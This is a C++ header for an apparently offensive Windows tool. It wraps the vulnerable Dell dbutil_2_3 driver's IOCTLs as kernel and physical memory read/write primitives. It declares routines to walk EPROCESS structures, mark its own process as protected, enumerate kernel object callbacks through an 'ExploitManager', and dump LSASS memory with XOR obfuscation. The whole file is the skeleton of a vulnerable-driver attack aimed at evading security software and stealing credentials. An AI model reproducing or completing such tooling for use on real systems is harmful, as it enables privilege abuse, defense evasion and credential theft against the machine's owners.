#pragma once
// C++ Standard Libraries
//#include <iostream> // maybe conflicts here
#include <algorithm>
#include <vector>
#include <string>
#include <tchar.h>
// Native Windows Libraries
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
// Generic Definitions
#define SYSTEM_PROCESSID 0x4
#define SYSTEM_NAME "System"
// EPROCESS Offsets
#define EPROCESS_PROCeSSID 0x440
#define EPROCESS_ACTIVEPROCESSLINKS 0x448
#define EPROCESS_DIRECTORYTABLEBASE 0x28
#define EPROCESS_NAME 0x5A8
#define EPROCESS_MAX_NAME_SIZE 0xFF
// Size of the parameters/header of each IOCTL packet/buffer
#define VIRTUAL_PACKET_HEADER_SIZE 0x18
#define PHYSICAL_PACKET_HEADER_SIZE 0x10
#define PARAMETER_SIZE 0x8
#define GARBAGE_VALUE 0xDEADBEEF
// IOCTL Codes for dbutil Driver Dispatch Methods
#define IOCTL_VIRTUAL_READ		0x9B0C1EC4
#define IOCTL_VIRTUAL_WRITE		0x9B0C1EC8
#define	IOCTL_PHYSICAL_READ		0x9B0C1F40
#define	IOCTL_PHYSICAL_WRITE	0x9B0C1F44

#define UNICODE 1
#define _UNICODE 1
#define wszDrive L"\\\\.\\dbutil_2_3"


typedef struct _MY_STRUCT {
	std::vector<std::string> names;
	std::vector<DWORD64> eprocess;
	std::vector<BOOL> protection;
	BOOL flag;
} MY_STRUCT, * PMY_STRUCT;

class DBUTIL {
public:
	HANDLE DriverHandle;
	DBUTIL();
	~DBUTIL();
	// Virtual Kernel Memory Read Primitive
	BOOL VirtualRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead);
	// Virtual Kernel Memory Write Primitive
	BOOL VirtualWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite);

	// Physical Memory Read Primitive
	BOOL PhysicalRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead);

	// Physical Memory Write Primitive
	BOOL PhysicalWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite);

	// Gets kernel base address for modules
	DWORD64 GetKernelBase(_In_ std::string name);

	// Gets pointer to a processes EPROCESS struct 
	MY_STRUCT GetEPROCESSPointer(_In_ DWORD64 ntoskrnlBase, _In_ std::vector<std::string> processNames); // changed 2nd parm
	MY_STRUCT GetAllEPROCESSPointer(_In_ DWORD64 ntoskrnlBase);
	//DWORD64 GetSafeEPROCESSPointer(_In_ DWORD64 ntoskrnlBase);
	DWORD64 GetSelfEPROCESSAddress();
	int SetCurrentProcessAsProtected();


	VOID ReadMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size) {
		VirtualRead(Address, Buffer, Size);
	}

	VOID WriteMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size) {
		VirtualWrite(Address, Buffer, Size);
	}
};

// ENUM DEFS
#define DECLARE_OFFSET(STRUCTNAME, OFFSETNAME) DWORD64 Offset_ ## STRUCTNAME ## _ ## OFFSETNAME
#define DECLARE_SYMBOL(SYMBOL) DWORD64 Sym_ ## SYMBOL
void EnumAllObjectsCallbacks(DBUTIL* ExploitManager, DWORD64 ntoskrnlBaseAddress);
// END

#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")
// LSASS DUMP things
void XOR(char* data, int data_len, char* key, int key_len);
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput);

// Für GetSelfEPROCESSAddress
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
//unsigned long long EPROCESSOffset = 0x2bc330;
#define SystemHandleInformation 0x10
#define SystemHandleInformationBaseSize 0x1000
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

//DWORD64 GetSelfEPROCESSAddress();

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _PS_PROTECTED_TYPE {
	PsProtectedTypeNone = 0,
	PsProtectedTypeProtectedLight = 1,
	PsProtectedTypeProtected = 2
} PS_PROTECTED_TYPE, * PPS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
	PsProtectedSignerNone = 0,
	PsProtectedSignerAuthenticode,
	PsProtectedSignerCodeGen,
	PsProtectedSignerAntimalware,
	PsProtectedSignerLsa,
	PsProtectedSignerWindows,
	PsProtectedSignerWinTcb,
	PsProtectedSignerWinSystem,
	PsProtectedSignerApp,
	PsProtectedSignerMax
} PS_PROTECTED_SIGNER, * PPS_PROTECTED_SIGNER;
